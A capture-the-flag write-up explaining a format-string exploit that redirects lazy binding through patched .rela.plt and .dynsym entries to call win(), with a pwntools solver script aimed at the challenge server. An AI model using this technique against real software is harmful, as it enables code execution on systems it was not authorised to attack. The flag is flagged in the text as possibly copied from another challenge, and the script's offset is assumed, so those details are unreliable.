# Talking Mirror

## Description
A 64-bit ELF reads a line with `fgets(buf, 0x64, stdin)` and then calls `printf(buf)` followed by `exit(0)`. The goal is to print flag.txt via the provided `win()` function.

## Solution
The bug is a classic format-string vulnerability (`printf(buf)`) with NX enabled. The obvious exploit is to overwrite `exit@GOT` with `win`, but every `.got.plt` address is `0x400a**` and therefore contains a `0x0a` byte; `fgets()` stops at newline, so you cannot place any `.got.plt` pointer directly in the input.

**Key observation:** the first PT_LOAD segment is RW and contains `.dynsym` and `.rela.plt` at fixed addresses (no PIE), and those addresses do not contain `0x0a`. We can avoid writing to `.got.plt` entirely by redirecting lazy binding:

-   `exit@plt` triggers the dynamic linker (`_dl_fixup`) using the exit relocation entry in `.rela.plt`.
-   That relocation’s `r_info` encodes the symbol index. For exit, the symbol index is 10.
-   If we change the symbol index to 11 (stdout) in that relocation, the `exit@plt` call will resolve the symbol `stdout` instead of `exit`.
-   `stdout` (dynsym index 11) is one of the few symbols actually present in the executable’s `.gnu.hash` (symoffset=11), so `_dl_lookup_symbol_x` will find the executable’s stdout definition.
-   Patch `dynsym[11].st_value` to the address of `win` (0x401216). Now “resolving stdout” returns `win`.
-   When `vuln()` calls `exit(0)`, the resolver jumps to `win()`, which prints the flag and `_exit(0)`s.

**Concrete writes (all to the RW first segment):**
-   `.rela.plt` exit entry is at `0x400638 + 7*24 = 0x4006e0`. `r_info` is at `0x4006e8`. The symbol index (high 32 bits) is stored at `0x4006ec`; write `0x0b` to make it symbol 11.
-   `.dynsym` base is `0x4003d8`, entry size 24. `dynsym[11]` starts at `0x4003d8 + 11*24 = 0x4004e0`. `st_value` is at `0x4004e8`; write `0x401216` (done as two %hn writes: `0x0040` at `0x4004ea` and `0x1216` at `0x4004e8`).

## Flag
`p_ctf{14UnDryHASbEenSUCces$fU11YCOMP1e73d}` (Note: Flag appears shared with Dirty Laundry in source data, verify if distinct)

## Solver Script

```python
from pwn import *

# context.log_level = 'debug'

def solve():
    r = remote('talking-mirror.ctf.prgy.in', 1337)
    
    # Addresses from Writeup (No PIE)
    rela_plt_exit_r_info = 0x4006e8 # address of r_info for exit relocation
    rela_plt_exit_sym_idx_addr = 0x4006ec # The high 32 bits of r_info contain the index
    
    dynsym_11_st_value = 0x4004e8 # address of st_value for symbol 11 (stdout)
    win_addr = 0x401216
    
    # Exploit: Format String
    # 1. Change symbol index of exit relocation from 10 to 11.
    #    Target: 0x4006ec. Old value: 10 (0x0a). New value: 11 (0x0b).
    #    This is a 1 byte write? Or we can write the whole r_info.
    #    r_info is 64-bit. symbol index is high 32.
    
    # 2. Change st_value of symbol 11 (stdout) to win_addr.
    #    Target: 0x4004e8 (low 32 bits) and 0x4004ec (high 32 bits?).
    #    st_value is 64-bit.
    #    We overwrite with 0x401216.
    
    # Format String Payload Construction
    # We need to determine the offset of our buffer in printf.
    # buf is at stack. fgets(buf).
    # Typical offset is 6.
    
    # Writes:
    # A. Write 0x0b to 0x4006ec
    # B. Write 0x1216 to 0x4004e8 (low word)
    # C. Write 0x0040 to 0x4004ea (high word of low 32 bits) 
    #    Wait, 0x401216 is the full address. 
    #    0x4004e8 gets 0x1216
    #    0x4004ea gets 0x0040
    
    # Payload order: addresses first, then %n specifiers.
    
    # Addresses to write to:
    addr1 = 0x4006ec # For 0x0b
    addr2 = 0x4004e8 # For 0x1216 (4630 decimal)
    addr3 = 0x4004ea # For 0x0040 (64 decimal)
    
    # Values to write (cumulative)
    # 1. 0x0b (11 chars)
    # 2. 0x0040 (64 chars) -> diff = 64 - 11 = 53
    # 3. 0x1216 (4630 chars) -> diff = 4630 - 64 = 4566
    
    # Note: We must sort writes by value size to be efficient/possible.
    # 11 < 64 < 4630. Good order.
    
    # Construct payload
    # Let's assume offset 6. 
    # Padding might be needed to align addresses.
    
    # Using pwntools fmtstr_payload is easier if it works, but manual is safer for delicate chains.
    # Let's use fmtstr_payload for simplicity in the script template.
    
    writes = {
        addr1: 0x0b,        # Change exit sym idx to 11
        0x4004e8: 0x401216  # Change stdout value to win (will handle splitting automatically)
    }
    
    # Offset definition
    offset = 6
    
    payload = fmtstr_payload(offset, writes, write_size='short')
    
    # Check if payload contains newline \n (0x0a). 
    # fmtstr_payload optimizes. Address bytes might naturally contain 0x0a?
    # Addresses: 40 06 ec, 40 04 e8. No 0a.
    # Values: 0b, 40, 12, 16. No 0a.
    # Lengths might produce 0a?
    
    if b'\n' in payload:
        log.warning("Payload contains newline! Adjusting...")
        # Fallback to manual construction or splitting writes differently if needed
    
    r.sendline(payload)
    r.interactive()

if __name__ == "__main__":
    solve()
```

